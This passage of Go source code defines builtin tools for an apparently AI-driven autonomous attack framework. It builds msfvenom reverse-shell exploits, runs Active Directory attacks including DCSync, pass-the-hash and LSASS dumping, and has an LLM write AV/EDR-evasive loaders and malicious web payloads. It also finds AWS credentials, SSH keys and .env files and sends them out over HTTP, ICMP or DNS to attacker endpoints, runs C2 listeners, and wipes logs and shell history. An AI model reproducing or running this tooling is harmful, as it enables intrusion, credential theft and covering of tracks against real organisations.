		fileName := fmt.Sprintf("fuzzer_%d.py", time.Now().Unix())
		containerPath := "/workspace/" + fileName

		err = r.sandbox.WriteFile(ctx, containerPath, fuzzerScript)
		if err != nil {
			return fmt.Sprintf("[Fuzzing Engine Error] Failed to write fuzzer to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		echo "[*] Initializing Autonomous Zero-Day Fuzzing Engine..."
		echo "[*] Target: %s:%d (%s)"
		echo "[*] Mutation Depth: %d/10"
		
		(command -v python3 &> /dev/null || (export DEBIAN_FRONTEND=noninteractive; apt-get update -qq && apt-get install -y -qq python3 python3-requests ))> /dev/null 2>&1
		
		echo "[*] Executing AI-Generated Fuzzer (%s)..."
		timeout 60s python3 %s || echo "[!] Fuzzer hit safety timeout or crashed."
		`, targetIp, targetPort, strings.ToUpper(protocol), fuzzingDepth, fileName, containerPath)

		output, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Fuzzing Engine Error] Execution failed: %v\nOutput: %s", err, output)
		}

		snippet := fuzzerScript
		if len(snippet) > 300 {
			snippet = snippet[:300] + "..."
		}

		return fmt.Sprintf("[ZERO-DAY FUZZING RESULTS]\nTarget: %s:%d\nProtocol: %s\n\n--- AI Fuzzer Source Snippet ---\n%s\n\n--- Execution Log ---\n%s",
			targetIp, targetPort, protocol, snippet, output)
	}

	r.builtins["autonomous_exploit_writer"] = func(ctx context.Context, args map[string]any) string {
		filename, _ := args["filename"].(string)
		language, _ := args["language"].(string)
		exploitCodeTemplate, _ := args["exploitCodeTemplate"].(string)

		payloadConfig, ok := args["payloadConfig"].(map[string]any)
		if !ok {
			return "[Error] payloadConfig object is required"
		}

		payload, _ := payloadConfig["payload"].(string)
		lhost, _ := payloadConfig["lhost"].(string)
		lport, _ := payloadConfig["lport"].(string)
		format, _ := payloadConfig["format"].(string)
		badChars, _ := payloadConfig["badChars"].(string)

		if filename == "" || language == "" || exploitCodeTemplate == "" || payload == "" || lhost == "" || lport == "" || format == "" {
			return "[Error] Missing required parameters. Need: filename, language, exploitCodeTemplate, payloadConfig(payload, lhost, lport, format)"
		}

		msfCommand := fmt.Sprintf("msfvenom -p %s LHOST=%s LPORT=%s -f %s", payload, lhost, lport, format)
		if badChars != "" {
			msfCommand += fmt.Sprintf(" -b \"%s\"", badChars)
		}

		shellcode, err := r.sandbox.Execute(ctx, msfCommand)
		if err != nil {
			return fmt.Sprintf("[Exploit Generation Failed] Sandbox error executing msfvenom: %v\nOutput: %s", err, shellcode)
		}

		if strings.Contains(shellcode, "Error") || len(shellcode) < 10 {
			return fmt.Sprintf("[Exploit Generation Failed] MSFVenom output error: %s", shellcode)
		}

		finalExploit := strings.ReplaceAll(exploitCodeTemplate, "<<PAYLOAD_PLACEHOLDER>>", shellcode)

		containerPath := "/workspace/" + filename
		err = r.sandbox.WriteFile(ctx, containerPath, finalExploit)
		if err != nil {
			return fmt.Sprintf("[Exploit Writer Error] Failed to write exploit to sandbox: %v", err)
		}

		if language != "c" {
			_, _ = r.sandbox.Execute(ctx, fmt.Sprintf("chmod +x %s", containerPath))
		}

		response := fmt.Sprintf("[Exploit Weaponized] Weaponized exploit saved to %s in Kali Sandbox.\n", containerPath)
		if language == "c" {
			response += fmt.Sprintf("Action: Run 'gcc %s -o %s' inside sandbox to compile.", containerPath, strings.TrimSuffix(containerPath, ".c"))
		}

		return response
	}

	r.builtins["autonomous_ad_exploiter"] = func(ctx context.Context, args map[string]any) string {
		targetDcIp, _ := args["targetDcIp"].(string)
		domain, _ := args["domain"].(string)
		username, _ := args["username"].(string)
		password, _ := args["password"].(string) // this could be an NTLM hash
		hashAuth, _ := args["hashAuth"].(bool)
		attackType, _ := args["attackType"].(string)

		if targetDcIp == "" || domain == "" || username == "" || password == "" || attackType == "" {
			return "[Error] targetDcIp, domain, username, password, and attackType are required"
		}

		// Map to existing ad templates
		params := map[string]string{
			"dc_ip":  targetDcIp,
			"domain": domain,
			"user":   username,
			"target": targetDcIp,
		}

		if hashAuth {
			params["ntlm_hash"] = password
		} else {
			params["password"] = password
		}

		// We need to map the "attackType" to the template names
		templateName := ""
		switch strings.ToLower(attackType) {
		case "dcsync":
			templateName = "ad_dcsync"
		case "kerberoast":
			templateName = "ad_kerberoast"
		case "asreproast":
			templateName = "ad_asreproast"
		case "pass_the_hash", "pth":
			templateName = "ad_pass_the_hash"
		case "bloodhound":
			templateName = "ad_bloodhound"
		default:
			// Attempt to use it directly if it matches our registry
			templateName = attackType
		}

		res, err := exploits.RunADTemplate(ctx, templateName, params, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AD Exploiter Error] %v", err)
		}

		return fmt.Sprintf("[AD EXPLOITATION RESULTS - %s]\n\n%s", strings.ToUpper(templateName), res.Output)
	}

	r.builtins["dynamic_payload_compiler"] = func(ctx context.Context, args map[string]any) string {
		shellcodePath, _ := args["shellcodePath"].(string)
		language, _ := args["language"].(string)
		architecture, _ := args["architecture"].(string)
		outputName, _ := args["outputName"].(string)

		if shellcodePath == "" || language == "" || architecture == "" || outputName == "" {
			return "[Error] shellcodePath, language, architecture, and outputName are required"
		}

		if r.provider == nil {
			return "[Compiler Error] LLM provider not available for payload generation."
		}

		prompt := fmt.Sprintf(`You are an elite malware developer writing an AV/EDR-evasive shellcode loader in %s for %s architecture.
The raw shellcode bytes will be read from '%s' at runtime, or you can write a placeholder array like 'SHELLCODE_PLACEHOLDER'.
Ensure you include techniques like API hashing, sleep obfuscation, or dynamic invocation if applicable.
OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, language, architecture, shellcodePath)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		loaderSrc, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Compiler Error] Failed to generate loader source: %v", err)
		}

		loaderSrc = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(loaderSrc, "")
		loaderSrc = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(loaderSrc, "")

		// Determine file extensions and compile commands
		var ext, compileCmd string
		switch strings.ToLower(language) {
		case "go", "golang":
			ext = ".go"
			compileCmd = fmt.Sprintf("go build -trimpath -ldflags='-s -w -H=windowsgui' -buildvcs=false -o /workspace/%s /workspace/loader%s", outputName, ext)
			if strings.ToLower(architecture) == "windows" {
				compileCmd = "GOOS=windows GOARCH=amd64 " + compileCmd
			}
		case "c", "c++", "cpp":
			ext = ".c"
			compileCmd = fmt.Sprintf("gcc /workspace/loader%s -o /workspace/%s -s -w", ext, outputName)
			if strings.ToLower(architecture) == "windows" {
				compileCmd = fmt.Sprintf("x86_64-w64-mingw32-gcc /workspace/loader%s -o /workspace/%s.exe -s -w -mwindows", ext, outputName)
			}
		default:
			return fmt.Sprintf("[Compiler Error] Unsupported language: %s", language)
		}

		srcPath := "/workspace/loader" + ext
		if err := r.sandbox.WriteFile(ctx, srcPath, loaderSrc); err != nil {
			return fmt.Sprintf("[Compiler Error] Failed to write source to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		echo "[*] Initializing Dynamic Payload Compiler..."
		echo "[*] Target: %s / %s"
		
		(command -v go &> /dev/null || (export DEBIAN_FRONTEND=noninteractive; apt-get update -qq && apt-get install -y -qq golang gcc mingw-w64)) > /dev/null 2>&1
		
		echo "[*] Compiling evasive loader..."
		%s
		ls -la /workspace/%s*
		`, language, architecture, compileCmd, outputName)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Compiler Error] Compilation failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[PAYLOAD COMPILED]\nOutput saved to: /workspace/%s\n\nExecution Log:\n%s", outputName, out)
	}

	r.builtins["swarm_pivot_orchestrator"] = func(ctx context.Context, args map[string]any) string {
		compromisedIp, _ := args["compromisedIp"].(string)
		internalSubnet, _ := args["internalSubnet"].(string)
		pivotTool, _ := args["pivotTool"].(string) // e.g. "chisel" or "ssh"

		if compromisedIp == "" || internalSubnet == "" || pivotTool == "" {
			return "[Error] compromisedIp, internalSubnet, and pivotTool are required"
		}

		// First, attempt to find an active session for the compromised IP
		sessionID := ""
		for _, id := range shell.GlobalShells.List() {
			s, _ := shell.GlobalShells.Get(id)
			// This is a naive check; in a real scenario we'd track IPs better.
			// Let's assume the session ID itself or info contains the IP.
			// Since we don't have s.Info, we'll just check if the ID contains the IP, or the remote addr.
			if strings.Contains(s.RemoteAddr, compromisedIp) || id == compromisedIp {
				sessionID = id
				break
			}
		}

		if sessionID == "" {
			return fmt.Sprintf("[Pivot Error] No active shell session found for IP: %s", compromisedIp)
		}

		out, err := pivot.DeployPivot(ctx, sessionID, 1080, r.sandbox.GetContainerIP(ctx), r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Pivot Error] Failed to deploy pivot: %v", err)
		}

		routeOut, err := pivot.RouteTraffic(ctx, internalSubnet, 1080, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Pivot Route Error] %v\nDeploy output: %s", err, out)
		}

		return fmt.Sprintf("[SWARM PIVOT ESTABLISHED]\nTool: %s\nTarget: %s\nSubnet: %s\n\nDeploy Log:\n%s\nRouting Log:\n%s", pivotTool, compromisedIp, internalSubnet, out, routeOut)
	}

	r.builtins["advanced_web_exploiter"] = func(ctx context.Context, args map[string]any) string {
		command, _ := args["command"].(string)
		if command == "" {
			return "[Error] command is required"
		}

		if r.provider == nil {
			return "[Web Exploit Error] LLM provider not available for payload generation."
		}

		prompt := fmt.Sprintf(`You are an elite web application pentester.
The operator wants to execute the following web exploitation task: "%s".
This involves either SSTI, JWT forging, or advanced injection.
Write a COMPLETE Python 3 script using requests (and PyJWT if needed) to perform this attack and print the result.
Ensure the script is robust and catches exceptions.
OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, command)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		scriptSrc, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Web Exploit Error] Failed to generate exploit script: %v", err)
		}

		scriptSrc = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(scriptSrc, "")
		scriptSrc = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(scriptSrc, "")

		scriptPath := "/tmp/web_exploit.py"
		if err := r.sandbox.WriteFile(ctx, scriptPath, scriptSrc); err != nil {
			return fmt.Sprintf("[Web Exploit Error] Failed to write script to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		(pip3 install requests pyjwt -q) > /dev/null 2>&1
		python3 %s
		`, scriptPath)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Web Exploit Error] Execution failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[ADVANCED WEB EXPLOITER RESULT]\nTask: %s\n\n%s", command, out)
	}

	r.builtins["headless_browser_automation"] = func(ctx context.Context, args map[string]any) string {
		url, _ := args["url"].(string)
		action, _ := args["action"].(string)

		if url == "" || action == "" {
			return "[Error] url and action are required"
		}

		if r.provider == nil {
			return "[Browser Error] LLM provider not available for payload generation."
		}

		prompt := fmt.Sprintf(`You are an expert at Puppeteer/Node.js browser automation.
The operator wants to execute the following browser automation task on "%s": "%s".
Write a COMPLETE Node.js script using 'puppeteer' to perform this action.
Assume puppeteer is already installed.
Launch the browser with arguments: ['--no-sandbox', '--disable-setuid-sandbox', '--ignore-certificate-errors'].
Print any discovered data or success messages to console.log.
Ensure you close the browser at the end.
OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, url, action)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		scriptSrc, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Browser Error] Failed to generate automation script: %v", err)
		}

		scriptSrc = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(scriptSrc, "")
		scriptSrc = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(scriptSrc, "")

		scriptPath := "/tmp/browser_automation.js"
		if err := r.sandbox.WriteFile(ctx, scriptPath, scriptSrc); err != nil {
			return fmt.Sprintf("[Browser Error] Failed to write script to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		# Install nodejs and puppeteer if missing
		(command -v node &> /dev/null || (curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && apt-get install -y nodejs)) > /dev/null 2>&1
		(npm list -g puppeteer &> /dev/null || npm install -g puppeteer) > /dev/null 2>&1
		
		# Execute
		NODE_PATH=$(npm root -g) node %s
		`, scriptPath)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Browser Error] Execution failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[HEADLESS BROWSER RESULT]\nTarget: %s\nAction: %s\n\n%s", url, action, out)
	}

	r.builtins["c2_listener_orchestrator"] = func(ctx context.Context, args map[string]any) string {
		action, _ := args["action"].(string)
		portRaw, _ := args["port"].(float64)
		port := int(portRaw)

		if action == "" || port == 0 {
			return "[Error] action and port are required"
		}

		switch strings.ToLower(action) {
		case "start", "listen":
			sessionID, err := r.shells.Listen(port)
			if err != nil {
				return fmt.Sprintf("[C2 Error] Failed to start listener on %d: %v", port, err)
			}
			return fmt.Sprintf("[C2 Listener Started]\nListening on port %d.\nBackground Session ID: %s", port, sessionID)

		case "status", "check":
			sessionIDs := r.shells.List()
			return fmt.Sprintf("[C2 Status]\nActive Sessions: %d", len(sessionIDs))

		case "stop", "kill":
			sessionID, _ := args["session_id"].(string)
			if sessionID == "" {
				return "[C2 Error] session_id is required to stop a listener"
			}
			r.shells.Remove(sessionID)
			return fmt.Sprintf("[C2] Listener %s stopped successfully", sessionID)

		default:
			return fmt.Sprintf("[Error] Unknown action: %s", action)
		}
	}

	r.builtins["crypto_math_engine"] = func(ctx context.Context, args map[string]any) string {
		pythonScript, _ := args["pythonScript"].(string)

		if pythonScript == "" {
			return "[Error] pythonScript is required"
		}

		scriptPath := "/tmp/crypto_solver.py"
		if err := r.sandbox.WriteFile(ctx, scriptPath, pythonScript); err != nil {
			return fmt.Sprintf("[Crypto Error] Failed to write script to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		(pip3 install pycryptodome sympy z3-solver -q) > /dev/null 2>&1
		python3 %s
		`, scriptPath)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Crypto Error] Execution failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[CRYPTO MATH ENGINE RESULT]\n\n%s", out)
	}

	r.builtins["smart_data_exfiltration"] = func(ctx context.Context, args map[string]any) string {
		searchTarget, _ := args["searchTarget"].(string)  // e.g. "aws", "ssh", "env"
		channel, _ := args["channel"].(string)            // e.g. "http", "dns", "ping"
		startListener, _ := args["startListener"].(bool)
		c2Endpoint, _ := args["c2_endpoint"].(string)     // e.g. "http://ATTACKER:8080" or "ATTACKER_IP" for ping

		if searchTarget == "" || channel == "" {
			return "[Error] searchTarget and channel are required"
		}

		var searchCmd string
		switch strings.ToLower(searchTarget) {
		case "aws":
			searchCmd = `find / -name "credentials" -path "*/.aws/*" 2>/dev/null`
		case "ssh":
			searchCmd = `find / -name "id_rsa" -path "*/.ssh/*" 2>/dev/null`
		case "env":
			searchCmd = `find / -name ".env" 2>/dev/null`
		default:
			// Just a generic regex search for the target
			searchCmd = fmt.Sprintf(`find / -type f -exec grep -l "%s" {} + 2>/dev/null | head -n 5`, searchTarget)
		}

		// First, find the files
		filesRaw, err := r.sandbox.Execute(ctx, searchCmd)
		if err != nil {
			return fmt.Sprintf("[Exfiltration Error] Search failed: %v", err)
		}

		files := strings.Split(strings.TrimSpace(filesRaw), "\n")
		if len(files) == 0 || files[0] == "" {
			return fmt.Sprintf("[-] No files found matching target: %s", searchTarget)
		}

		// Resolve the collection endpoint. An operator-controlled c2Endpoint is
		// preferred; without one the http channel falls back to a sandbox-local
		// collector that saves POST bodies under /tmp/http_exfil_received so
		// data is actually captured instead of posted into the void.
		endpointHost := r.sandbox.GetContainerIP(ctx)
		localCollector := false
		if c2Endpoint != "" {
			endpointHost = c2Endpoint
		} else if strings.EqualFold(channel, "http") {
			collector := `cat > /tmp/http_collect.py << 'PEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import os, time
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(n)
        d = '/tmp/http_exfil_received'
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, 'chunk_%d.bin' % time.time_ns()), 'wb').write(data)
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
PEOF
nohup python3 /tmp/http_collect.py > /tmp/http_collect.log 2>&1 &
sleep 1`
			if _, err := r.sandbox.Execute(ctx, collector); err != nil {
				return fmt.Sprintf("[Exfiltration Error] failed to start HTTP collector: %v", err)
			}
			localCollector = true
		}

		listenerInfo := ""
		if startListener {
			if strings.EqualFold(channel, "http") {
				if localCollector {
					listenerInfo = fmt.Sprintf("[+] Started in-sandbox HTTP collector on :8080 -> /tmp/http_exfil_received (container-local).")
				} else {
					listenerInfo = fmt.Sprintf("[+] Using operator-controlled C2 endpoint: %s", c2Endpoint)
				}
			} else {
				listenerInfo = fmt.Sprintf("[!] startListener only applies to the http channel; continuing with %s", channel)
			}
		}

		var exfilResults strings.Builder
		exfilResults.WriteString(fmt.Sprintf("[*] Found %d files. Attempting exfiltration via %s...\n%s\n", len(files), channel, listenerInfo))
		if !strings.EqualFold(channel, "http") {
			exfilResults.WriteString(fmt.Sprintf("[*] Endpoint: %s\n", endpointHost))
		}

		httpBase := endpointHost
		if strings.HasPrefix(c2Endpoint, "http://") || strings.HasPrefix(c2Endpoint, "https://") {
			httpBase = strings.TrimRight(c2Endpoint, "/")
		} else if c2Endpoint != "" && !strings.Contains(c2Endpoint, "://") {
			httpBase = fmt.Sprintf("http://%s", strings.TrimRight(c2Endpoint, "/"))
		}

		for _, file := range files {
			if file == "" {
				continue
			}
			var cmd string
			switch strings.ToLower(channel) {
			case "http":
				cmd = fmt.Sprintf(`curl -s -X POST --data-binary @"%s" %s/exfil && echo "OK" || echo "Failed"`, file, httpBase)
			case "ping":
				host := endpointHost
				if i := strings.IndexAny(host, ":/"); i != -1 {
					host = host[:i]
				}
				cmd = fmt.Sprintf(`cat "%s" | xxd -p -c 16 | while read line; do ping -c 1 -W 1 -p $line %s >/dev/null 2>&1; done; echo "Ping exfil done"`, file, host)
			default:
				cmd = fmt.Sprintf(`echo "Unsupported channel: %s"`, channel)
			}

			out, _ := r.sandbox.Execute(ctx, cmd)
			exfilResults.WriteString(fmt.Sprintf("[+] %s: %s\n", file, strings.TrimSpace(out)))
		}

		if localCollector {
			exfilResults.WriteString("[*] Recovered data is staged inside the sandbox under /tmp/http_exfil_received (docker cp .:/tmp/http_exfil_received out/).\n")
		}
		return exfilResults.String()
	}

	r.builtins["zero_click_exploiter"] = func(ctx context.Context, args map[string]any) string {
		payloadType, _ := args["payloadType"].(string)
		targetObjective, _ := args["targetObjective"].(string)
		webhookUrl, _ := args["webhookUrl"].(string)

		if payloadType == "" || targetObjective == "" {
			return "[Error] payloadType and targetObjective are required"
		}

		if r.provider == nil {
			return "[Zero Click Error] LLM provider not available for payload generation."
		}

		prompt := fmt.Sprintf(`You are an elite client-side vulnerability researcher.
Write a malicious %s payload to achieve the following objective: "%s".
If exfiltration is required, send data to: %s
OUTPUT ONLY THE HTML OR JS CODE. NO EXPLANATIONS. NO MARKDOWN.`, payloadType, targetObjective, webhookUrl)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		payloadSrc, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Zero Click Error] Failed to generate payload: %v", err)
		}

		payloadSrc = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(payloadSrc, "")
		payloadSrc = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(payloadSrc, "")

		// Determine extension
		ext := ".html"
		if strings.ToLower(payloadType) == "js" || strings.ToLower(payloadType) == "javascript" {
			ext = ".js"
		}

		payloadPath := fmt.Sprintf("/workspace/exploit%s", ext)
		if err := r.sandbox.WriteFile(ctx, payloadPath, payloadSrc); err != nil {
			return fmt.Sprintf("[Zero Click Error] Failed to write payload to sandbox: %v", err)
		}

		// Host it
		hostCmd := fmt.Sprintf(`
		cd /workspace
		python3 -m http.server 8081 > /dev/null 2>&1 &
		echo $! > /tmp/zc_server.pid
		`)

		_, err = r.sandbox.Execute(ctx, hostCmd)
		if err != nil {
			return fmt.Sprintf("[Zero Click Error] Failed to start hosting server: %v", err)
		}

		return fmt.Sprintf("[ZERO CLICK PAYLOAD GENERATED]\nObjective: %s\nPayload hosted at: http://%s:8081/exploit%s\n\nWARNING: Click simulation is disabled. Deliver the payload URL to the target operator for manual testing.", targetObjective, r.sandbox.GetContainerIP(ctx), ext)
	}

	r.builtins["async_race_condition_engine"] = func(ctx context.Context, args map[string]any) string {
		command, _ := args["command"].(string)

		if command == "" {
			return "[Error] command is required"
		}

		if r.provider == nil {
			return "[Race Condition Error] LLM provider not available for payload generation."
		}

		prompt := fmt.Sprintf(`You are an elite application pentester.
The operator wants to execute a Time-Of-Check to Time-Of-Use (TOCTOU) race condition attack.
The objective is: "%s".
Write a COMPLETE Python 3 script using 'asyncio' and 'aiohttp' to perform this attack.
The script must blast the target with dozens of concurrent requests in the exact same millisecond.
Catch exceptions and print out any successful race condition results.
OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, command)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		scriptSrc, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Race Condition Error] Failed to generate exploit script: %v", err)
		}

		scriptSrc = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(scriptSrc, "")
		scriptSrc = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(scriptSrc, "")

		scriptPath := "/tmp/race_condition.py"
		if err := r.sandbox.WriteFile(ctx, scriptPath, scriptSrc); err != nil {
			return fmt.Sprintf("[Race Condition Error] Failed to write script to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		(pip3 install aiohttp -q) > /dev/null 2>&1
		python3 %s
		`, scriptPath)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Race Condition Error] Execution failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[ASYNC RACE CONDITION RESULT]\nObjective: %s\n\n%s", command, out)
	}

	r.builtins["dynamic_skill_synthesizer"] = func(ctx context.Context, args map[string]any) string {
		filename, _ := args["filename"].(string)
		toolName, _ := args["toolName"].(string)
		code, _ := args["code"].(string)

		if filename == "" || toolName == "" || code == "" {
			return "[Error] filename, toolName, and code are required"
		}

		if !strings.HasSuffix(filename, ".go") {
			filename += ".go"
		}

		// Write the dynamically synthesized Go code to the sandbox
		srcPath := "/workspace/" + filename
		if err := r.sandbox.WriteFile(ctx, srcPath, code); err != nil {
			return fmt.Sprintf("[Skill Synthesizer Error] Failed to write code to sandbox: %v", err)
		}

		macroCmd := fmt.Sprintf(`
		cd /workspace
		go mod init %s || true
		go mod tidy || true
		go run %s
		`, toolName, filename)

		out, err := r.sandbox.Execute(ctx, macroCmd)
		if err != nil {
			return fmt.Sprintf("[Skill Synthesizer Error] Execution failed: %v\n%s", err, out)
		}

		return fmt.Sprintf("[SKILL SYNTHESIZED & EXECUTED]\nTool: %s\n\n%s", toolName, out)
	}

	r.builtins["ad_dump_lsass"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		user, _ := args["user"].(string)
		if target == "" || user == "" {
			return "[Error] target and user are required"
		}
		domain, _ := args["domain"].(string)
		password, _ := args["password"].(string)
		ntlmHash, _ := args["ntlm_hash"].(string)
		result, err := lateral.DumpLSASS(ctx, target, user, domain, password, ntlmHash, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["ad_pass_the_hash"] = func(ctx context.Context, args map[string]any) string {
		targetIP, _ := args["target_ip"].(string)
		user, _ := args["user"].(string)
		hash, _ := args["hash"].(string)
		command, _ := args["command"].(string)
		if targetIP == "" || user == "" || hash == "" || command == "" {
			return "[Error] target_ip, user, hash, and command are required"
		}
		result, err := lateral.PassTheHash(ctx, targetIP, user, hash, command, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["ad_bloodhound_collect"] = func(ctx context.Context, args map[string]any) string {
		domain, _ := args["domain"].(string)
		dcIP, _ := args["dc_ip"].(string)
		username, _ := args["username"].(string)
		password, _ := args["password"].(string)
		hash, _ := args["hash"].(string)
		if domain == "" || dcIP == "" || username == "" {
			return "[Error] domain, dc_ip, and username are required"
		}
		result, err := lateral.BloodHoundCollect(ctx, domain, dcIP, username, password, hash, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["exfil_compress_encrypt"] = func(ctx context.Context, args map[string]any) string {
		sourcePath, _ := args["source_path"].(string)
		destPath, _ := args["dest_path"].(string)
		password, _ := args["password"].(string)
		if sourcePath == "" || destPath == "" || password == "" {
			return "[Error] source_path, dest_path, and password are required"
		}
		result, err := exfil.CompressAndEncrypt(ctx, sourcePath, destPath, password, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["exfil_dns_tunnel"] = func(ctx context.Context, args map[string]any) string {
		filePath, _ := args["file_path"].(string)
		targetDomain, _ := args["target_domain"].(string)
		if filePath == "" || targetDomain == "" {
			return "[Error] file_path and target_domain are required"
		}
		result, err := exfil.ExfiltrateDNS(ctx, filePath, targetDomain, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["exfil_icmp_ping"] = func(ctx context.Context, args map[string]any) string {
		filePath, _ := args["file_path"].(string)
		targetIP, _ := args["target_ip"].(string)
		if filePath == "" || targetIP == "" {
			return "[Error] file_path and target_ip are required"
		}
		result, err := exfil.ExfiltrateICMP(ctx, filePath, targetIP, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["ghost_wipe_logs"] = func(ctx context.Context, args map[string]any) string {
		osType, _ := args["os_type"].(string)
		sessionID, _ := args["session_id"].(string)
		if osType == "" {
			return "[Error] os_type is required"
		}
		result, err := ghost.WipeEventLogs(ctx, osType, sessionID, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Error] %v", err)
		}
		return result
	}

	r.builtins["ghost_secure_delete"] = func(ctx context.Context, args map[string]any) string {
		filePath, _ := args["file_path"].(string)
		osType, _ := args["os_type"].(string)
		sessionID, _ := args["session_id"].(string)
		if filePath == "" || osType == "" {
			return "[Error] file_path and os_type are required"
		}
		result, err := ghost.SecureDelete(ctx, filePath, osType, sessionID, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Error] %v", err)
		}
		return result
	}

	r.builtins["ghost_clear_history"] = func(ctx context.Context, args map[string]any) string {
		osType, _ := args["os_type"].(string)
		sessionID, _ := args["session_id"].(string)
		if osType == "" {
			return "[Error] os_type is required"
		}
		result, err := ghost.ClearShellHistory(ctx, osType, sessionID, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Error] %v", err)
		}
		return result
	}

	// ── INTELLIGENCE BUILTINS ───────────────────────────────────────────────
	r.builtins["profile_target"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		trimmed := strings.TrimSpace(target)
		low := strings.ToLower(trimmed)
		// github.com/<user> is a people lookup — DNS/CT on the apex domain
		// wastes a turn and misleads the planner. Route it as GitHub OSINT.
		if strings.Contains(low, "github.com/") {
			// extract handle for a focused search
			handle := trimmed
			if idx := strings.Index(low, "github.com/"); idx >= 0 {
				handle = trimmed[idx+len("github.com/"):]
				handle = strings.Trim(handle, "/")
				if cut := strings.IndexAny(handle, "?#"); cut >= 0 {
					handle = handle[:cut]
				}
				if slash := strings.Index(handle, "/"); slash >= 0 {
					handle = handle[:slash]
				}
			}
			if handle == "" {
				handle = trimmed
			}
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("[GITHUB PROFILE — %s]\nDirect profile: https://github.com/%s\n", handle, handle))
			sb.WriteString("NOTE: profile_target DNS path is not applicable to a GitHub user. Use web_search + fetch_url for profile evidence.\n")
			if r.cfg != nil {
				if res, err := intel.Search(handle+" github profile", r.cfg.GetBraveAPIKey(), 5); err == nil && len(res) > 0 {
					sb.WriteString("\n[web_search fallback]\n")
					for i, rr := range res {
						sb.WriteString(fmt.Sprintf("%d. %s\n   URL: %s\n", i+1, rr.Title, rr.URL))
					}
				}
			}
			fetched, ferr := intel.FetchURL("https://github.com/" + handle)
			if ferr == nil && strings.TrimSpace(fetched) != "" {
				clip := fetched
				if len(clip) > 3500 {
					clip = clip[:3500] + "\n…(truncated)…"
				}
				sb.WriteString("\n[fetch_url https://github.com/" + handle + "]\n" + clip + "\n")
